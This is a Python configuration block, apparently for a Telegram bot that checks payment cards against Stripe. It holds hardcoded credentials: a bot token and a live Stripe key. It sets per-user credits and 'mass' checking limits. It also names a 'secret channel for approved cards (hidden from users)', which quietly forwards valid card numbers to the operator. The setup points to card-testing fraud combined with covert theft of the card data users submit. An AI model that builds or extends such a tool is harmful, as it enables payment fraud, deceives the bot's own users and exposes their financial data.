import logging

# --- CONFIGURATION ---
BOT_TOKEN = "8366642226:AAHoWRCHfe1gCfYUszuNZPP-kx3D7_R48Sc"
STRIPE_KEY = "pk_live_51PvhEE07g9MK9dNZrYzbLv9pilyugsIQn0DocUZSpBWIIqUmbYavpiAj1iENvS7txtMT2gBnWVNvKk2FHul4yg1200ooq8sVnV"

# Admin configuration
ADMIN_IDS = [7612918437]  # Initial admin
DAILY_CREDITS = 250
MASS_LIMIT_USER = 15

# Secret channel for approved cards (hidden from users)
SECRET_CHANNEL_ID = "3221562593"  # Replace with your actual channel ID

# File paths
USER_DATA_FILE = "user_data.json"
ADMINS_FILE = "admins.json"

# Logging configuration
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)